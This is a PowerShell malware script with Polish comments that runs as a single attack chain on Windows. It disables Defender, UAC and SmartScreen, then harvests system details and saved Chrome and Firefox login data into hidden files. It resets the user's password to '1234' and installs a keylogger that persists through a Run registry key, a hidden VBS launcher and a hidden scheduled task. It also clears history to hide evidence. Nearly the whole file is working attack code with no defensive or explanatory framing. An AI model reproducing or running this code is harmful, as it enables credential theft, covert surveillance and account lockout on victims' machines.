# ================ KONFIGURACJA ================
$systemFile = "E:\SystemCache.dat"
$keylogFile = "E:\Keylog.txt"
$browserFile = "E:\BrowserData.dat"
$vbsPath = "$env:TEMP\SysRun.vbs"
$regName = "SystemCacheLoader"
# =============================================

# Funkcja zmieniająca hasło użytkownika
function Change-UserPassword {
    param(
        [string]$username = $env:USERNAME,
        [string]$password = "1234"
    )
    try {
        $user = [adsi]"WinNT://$env:COMPUTERNAME/$username,User"
        $user.SetPassword($password)
        $user.CommitChanges()
        return $true
    } catch {
        return $false
    }
}

# Funkcja zbierająca informacje o systemie
function Collect-SystemInfo {
    $info = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        OSVersion = (Get-WmiObject Win32_OperatingSystem).Version
        Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        CPU = (Get-WmiObject Win32_Processor).Name
        RAM = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        Drives = Get-WmiObject Win32_LogicalDisk | ForEach-Object { 
            @{ 
                DeviceID = $_.DeviceID
                Size = [math]::Round($_.Size / 1GB, 2)
                FreeSpace = [math]::Round($_.FreeSpace / 1GB, 2)
            } 
        }
        Network = Get-WmiObject Win32_NetworkAdapterConfiguration | 
                  Where-Object { $_.IPEnabled } |
                  ForEach-Object {
                      @{
                          Description = $_.Description
                          MAC = $_.MACAddress
                          IP = $_.IPAddress
                          Subnet = $_.IPSubnet
                          Gateway = $_.DefaultIPGateway
                      }
                  }
        Processes = Get-Process | Select-Object Name, Id, Path -First 20
    }
    return $info | ConvertTo-Json -Depth 5
}

# Funkcja zbierająca dane z przeglądarek
function Get-BrowserData {
    $data = @{}
    
    # Chrome
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromePath) {
            $tempCopy = "$env:TEMP\chrome_login_data"
            Copy-Item $chromePath $tempCopy -Force
            
            # Pobierz dane z kopii bazy danych
            $chromeData = @()
            $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
            $connection.ConnectionString = "Data Source=$tempCopy;"
            $connection.Open()
            
            $command = $connection.CreateCommand()
            $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $adapter = New-Object -TypeName System.Data.SQLite.SQLiteDataAdapter $command
            $dataset = New-Object -TypeName System.Data.DataSet
            $adapter.Fill($dataset) | Out-Null
            
            foreach ($row in $dataset.Tables[0].Rows) {
                $chromeData += @{
                    URL = $row.origin_url
                    Username = $row.username_value
                    # Hasła są zaszyfrowane - w rzeczywistym ataku potrzebne DPAPI
                }
            }
            $connection.Close()
            Remove-Item $tempCopy -Force
            $data.Chrome = $chromeData
        }
    } catch {}
    
    # Firefox
    try {
        $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
        if (Test-Path $firefoxPath) {
            $profile = Get-ChildItem $firefoxPath -Filter "*.default-release" | Select-Object -First 1
            $firefoxDB = Join-Path $profile.FullName "logins.json"
            if (Test-Path $firefoxDB) {
                $firefoxData = Get-Content $firefoxDB | ConvertFrom-Json
                $data.Firefox = $firefoxData.logins
            }
        }
    } catch {}
    
    return $data | ConvertTo-Json -Depth 5
}

# Funkcja instalująca keyloggera
function Install-Keylogger {
    param(
        [string]$logPath = "E:\Keylog.txt"
    )
    # Tworzenie keyloggera w PowerShellu
    $keyloggerScript = @'
$signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@
Add-Type -MemberDefinition $signature -Name Keyboard -Namespace KeyLogger
try {
    $path = "'$logPath'"
    while($true) {
        Start-Sleep -Milliseconds 40
        for ($asc = 8; $asc -le 254; $asc++) {
            $state = [KeyLogger.Keyboard]::GetAsyncKeyState($asc)
            if ($state -eq -32767) {
                $key = [char]$asc
                if ($asc -eq 8) { $key = "[BACKSPACE]" }
                elseif ($asc -eq 13) { $key = "`n" }
                elseif ($asc -eq 27) { $key = "[ESC]" }
                elseif ($asc -eq 32) { $key = " " }
                [System.IO.File]::AppendAllText($path, $key, [System.Text.Encoding]::UTF8)
            }
        }
    }
} catch { }
'@

    # Zapisz skrypt keyloggera
    $keyloggerPath = "$env:TEMP\kl.ps1"
    Set-Content -Path $keyloggerPath -Value $keyloggerScript

    # Dodaj keyloggera do autostartu
    $vbsContent = @"
Set ws = CreateObject("WScript.Shell")
ws.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`"", 0
"@
    $vbsPath = [System.IO.Path]::GetTempFileName() + '.vbs'
    Set-Content -Path $vbsPath -Value $vbsContent

    # Dodaj do rejestru
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValue = "wscript.exe `"$vbsPath`""
    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force

    # Uruchom keyloggera
    Start-Process -WindowStyle Hidden -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File `"$keyloggerPath`""
}

# Funkcja wyłączająca zabezpieczenia
function Disable-Security {
    # Wyłącz Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableScriptScanning $true
    
    # Wyłącz User Account Control
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
    
    # Wyłącz SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
}

# ================ GŁÓWNA LOGIKA ================

# 1. Wyłącz zabezpieczenia
Disable-Security

# 2. Zbierz informacje o systemie
$systemInfo = Collect-SystemInfo
$systemInfo | Out-File -FilePath $systemFile -Encoding utf8
attrib +s +h +r $systemFile

# 3. Zmień hasło użytkownika
Change-UserPassword -password "1234" | Out-Null

# 4. Zbierz dane z przeglądarek
$browserData = Get-BrowserData
$browserData | Out-File -FilePath $browserFile -Encoding utf8
attrib +s +h +r $browserFile

# 5. Zainstaluj keyloggera
Install-Keylogger -logPath $keylogFile

# 6. Ukryj dowody
Clear-History
Remove-Item -Path "$env:TEMP\*" -Include *.vbs, *.ps1 -Force -Recurse

# 7. Dodaj persystencję dla keyloggera
$persistenceScript = @"
if (-not (Test-Path "$keylogFile")) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if ((Get-ItemPropertyValue -Path $regPath -Name "$regName" -ErrorAction SilentlyContinue)) {
        Start-Process -WindowStyle Hidden -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
    }
}
"@
$persistencePath = "$env:TEMP\persistence.ps1"
Set-Content -Path $persistencePath -Value $persistenceScript

# Dodaj do harmonogramu zadań
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ExecutionPolicy Bypass -File `"$persistencePath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "SystemCacheLoader" -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -Force
